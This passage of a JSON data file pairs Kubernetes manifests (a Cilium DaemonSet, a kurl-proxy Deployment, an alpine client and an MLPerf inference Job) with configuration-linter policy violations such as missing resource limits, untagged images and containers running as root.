volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"cilium-agent\" has cpu request 0"
  },
  {
    "id": "00950",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"clean-cilium-state\" has cpu request 0"
  },
  {
    "id": "00951",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"cilium-agent\" has memory limit 0"
  },
  {
    "id": "00952",
    "manifest_path": "data/manifests/the_stack_sample/sample_0233.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: DaemonSet\nmetadata:\n  name: cilium\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      k8s-app: cilium\n      kubernetes.io/cluster-service: 'true'\n  template:\n    metadata:\n      labels:\n        k8s-app: cilium\n        kubernetes.io/cluster-service: 'true'\n      annotations:\n        scheduler.alpha.kubernetes.io/critical-pod: ''\n        scheduler.alpha.kubernetes.io/tolerations: '[{\"key\":\"dedicated\",\"operator\":\"Equal\",\"value\":\"master\",\"effect\":\"NoSchedule\"}]'\n        prometheus.io/scrape: 'true'\n        prometheus.io/port: '9090'\n    spec:\n      serviceAccountName: cilium\n      initContainers:\n      - name: clean-cilium-state\n        image: docker.io/library/busybox:1.28.4\n        imagePullPolicy: IfNotPresent\n        command:\n        - sh\n        - -c\n        - if [ \"${CLEAN_CILIUM_STATE}\" = \"true\" ]; then rm -rf /var/run/cilium/state;\n          rm -rf /sys/fs/bpf/tc/globals/cilium_*; fi\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        env:\n        - name: CLEAN_CILIUM_STATE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: clean-cilium-state\n      containers:\n      - image: docker.io/cilium/cilium:latest\n        imagePullPolicy: Always\n        name: cilium-agent\n        command:\n        - cilium-agent\n        args:\n        - --debug=$(CILIUM_DEBUG)\n        - --kvstore=etcd\n        - --kvstore-opt=etcd.config=/var/lib/etcd-config/etcd.config\n        - --disable-ipv4=$(DISABLE_IPV4)\n        ports:\n        - name: prometheus\n          containerPort: 9090\n        env:\n        - name: K8S_NODE_NAME\n          valueFrom:\n            fieldRef:\n              fieldPath: spec.nodeName\n        - name: CILIUM_DEBUG\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: debug\n        - name: DISABLE_IPV4\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: disable-ipv4\n        - name: CILIUM_PROMETHEUS_SERVE_ADDR\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-metrics-config\n              optional: true\n              key: prometheus-serve-addr\n        - name: CILIUM_LEGACY_HOST_ALLOWS_WORLD\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              optional: true\n              key: legacy-host-allows-world\n        - name: CILIUM_SIDECAR_ISTIO_PROXY_IMAGE\n          valueFrom:\n            configMapKeyRef:\n              name: cilium-config\n              key: sidecar-istio-proxy-image\n              optional: true\n        - name: CILIUM_TUNNEL\n          valueFrom:\n            configMapKeyRef:\n              key: tunnel\n              name: cilium-config\n              optional: true\n        - name: CILIUM_MONITOR_AGGREGATION_LEVEL\n          valueFrom:\n            configMapKeyRef:\n              key: monitor-aggregation-level\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTERMESH_CONFIG\n          value: /var/lib/cilium/clustermesh/\n        - name: CILIUM_CLUSTER_NAME\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-name\n              name: cilium-config\n              optional: true\n        - name: CILIUM_CLUSTER_ID\n          valueFrom:\n            configMapKeyRef:\n              key: cluster-id\n              name: cilium-config\n              optional: true\n        livenessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 120\n          failureThreshold: 10\n          periodSeconds: 10\n        readinessProbe:\n          exec:\n            command:\n            - cilium\n            - status\n          initialDelaySeconds: 5\n          periodSeconds: 5\n        volumeMounts:\n        - name: bpf-maps\n          mountPath: /sys/fs/bpf\n        - name: cilium-run\n          mountPath: /var/run/cilium\n        - name: cni-path\n          mountPath: /host/opt/cni/bin\n        - name: etc-cni-netd\n          mountPath: /host/etc/cni/net.d\n        - name: docker-socket\n          mountPath: /var/run/docker.sock\n          readOnly: true\n        - name: etcd-config-path\n          mountPath: /var/lib/etcd-config\n          readOnly: true\n        - name: etcd-secrets\n          mountPath: /var/lib/etcd-secrets\n          readOnly: true\n        - name: clustermesh-secrets\n          mountPath: /var/lib/cilium/clustermesh\n          readOnly: true\n        securityContext:\n          capabilities:\n            add:\n            - NET_ADMIN\n          privileged: true\n      volumes:\n      - name: cilium-run\n        hostPath:\n          path: /var/run/cilium\n          type: DirectoryOrCreate\n      - name: bpf-maps\n        hostPath:\n          path: /sys/fs/bpf\n          type: DirectoryOrCreate\n      - name: docker-socket\n        hostPath:\n          path: /var/run/docker.sock\n          type: Socket\n      - name: cni-path\n        hostPath:\n          path: /opt/cni/bin\n          type: DirectoryOrCreate\n      - name: etc-cni-netd\n        hostPath:\n          path: /etc/cni/net.d\n          type: DirectoryOrCreate\n      - name: etcd-config-path\n        configMap:\n          name: cilium-config\n          items:\n          - key: etcd-config\n            path: etcd.config\n      - name: etcd-secrets\n        secret:\n          secretName: cilium-etcd-secrets\n          optional: true\n      - name: clustermesh-secrets\n        secret:\n          defaultMode: 420\n          optional: true\n          secretName: cilium-clustermesh\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"clean-cilium-state\" has memory limit 0"
  },
  {
    "id": "00953",
    "manifest_path": "data/manifests/the_stack_sample/sample_0234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "env-var-secret",
    "violation_text": "environment variable TLS_SECRET_NAME in container \"proxy\" found"
  },
  {
    "id": "00954",
    "manifest_path": "data/manifests/the_stack_sample/sample_0234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"proxy\" is using an invalid container image, \"kurl/proxy\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00955",
    "manifest_path": "data/manifests/the_stack_sample/sample_0234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"proxy\" does not have a read-only root file system"
  },
  {
    "id": "00956",
    "manifest_path": "data/manifests/the_stack_sample/sample_0234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"proxy\" is not set to runAsNonRoot"
  },
  {
    "id": "00957",
    "manifest_path": "data/manifests/the_stack_sample/sample_0234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"proxy\" has cpu request 0"
  },
  {
    "id": "00958",
    "manifest_path": "data/manifests/the_stack_sample/sample_0234.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: kurl-proxy\n  labels:\n    app: kurl-proxy\nspec:\n  selector:\n    matchLabels:\n      app: kurl-proxy\n  template:\n    metadata:\n      labels:\n        app: kurl-proxy\n    spec:\n      containers:\n      - name: proxy\n        image: kurl/proxy\n        env:\n        - name: NODE_PORT\n          value: '30880'\n        - name: UPSTREAM_ORIGIN\n          value: http://127.0.0.1:8800\n        - name: TLS_SECRET_NAME\n          value: kotsadm-tls\n        - name: NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        volumeMounts:\n        - name: kotsadm-config\n          mountPath: /etc/kotsadm\n      serviceAccount: kurl-proxy\n      volumes:\n      - name: kotsadm-config\n        configMap:\n          name: kotsadm-application-metadata\n          optional: true\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"proxy\" has memory limit 0"
  },
  {
    "id": "00959",
    "manifest_path": "data/manifests/the_stack_sample/sample_0235.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n  selector:\n    matchLabels:\n      app: client\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"client\" is using an invalid container image, \"alpine\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00960",
    "manifest_path": "data/manifests/the_stack_sample/sample_0235.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n  selector:\n    matchLabels:\n      app: client\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"client\" does not have a read-only root file system"
  },
  {
    "id": "00961",
    "manifest_path": "data/manifests/the_stack_sample/sample_0235.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n  selector:\n    matchLabels:\n      app: client\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"client\" is not set to runAsNonRoot"
  },
  {
    "id": "00962",
    "manifest_path": "data/manifests/the_stack_sample/sample_0235.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n  selector:\n    matchLabels:\n      app: client\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"client\" has cpu request 0"
  },
  {
    "id": "00963",
    "manifest_path": "data/manifests/the_stack_sample/sample_0235.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: client\n  labels:\n    app: client\nspec:\n  replicas: 1\n  template:\n    metadata:\n      name: client\n      labels:\n        app: client\n    spec:\n      containers:\n      - name: client\n        image: alpine\n        imagePullPolicy: IfNotPresent\n        command:\n        - bin/sh\n        - -c\n        - sleep 10086\n  selector:\n    matchLabels:\n      app: client\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"client\" has memory limit 0"
  },
  {
    "id": "00964",
    "manifest_path": "data/manifests/the_stack_sample/sample_0237.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-2\nspec:\n  template:\n    metadata:\n      name: tf-ssdmobilenet-default-1024-2-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"mlperf-inference-container\" is using an invalid container image, \"aferikoglou/mlperf-inference:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "00965",
    "manifest_path": "data/manifests/the_stack_sample/sample_0237.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-2\nspec:\n  template:\n    metadata:\n      name: tf-ssdmobilenet-default-1024-2-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"mlperf-inference-container\" does not have a read-only root file system"
  },
  {
    "id": "00966",
    "manifest_path": "data/manifests/the_stack_sample/sample_0237.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: tf-ssdmobilenet-default-1024-2\nspec:\n  template:\n    metadata:\n      name: tf-ssdmobilenet-default-1024-2-pod\n    spec:\n      containers:\n      - command:\n        - sh\n        - -c\n        - cp /root/configs/1024/mlperf.conf /root/inference/v0.5/ && cd /root/inference/v0.5/classification_and_detection\n          && MODEL_DIR=/root/models/tf-ssdmobilenet-default DATA_DIR=/root/datasets/coco-300\n          ./run_local.sh tf ssd-mobilenet gpu --scenario SingleStream\n        image: aferikoglou/mlperf-inference:latest\n        name: mlperf-inference-container\n        resources:\n          limits:\n            nvidia.com/gpu: 1\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"mlperf-inference-container\" is not set to runAsNonRoot"
  },
  {
    "id": "00967",
    "manifest_path": "data/manifests/the_stack_sample/sample_0237.yaml",
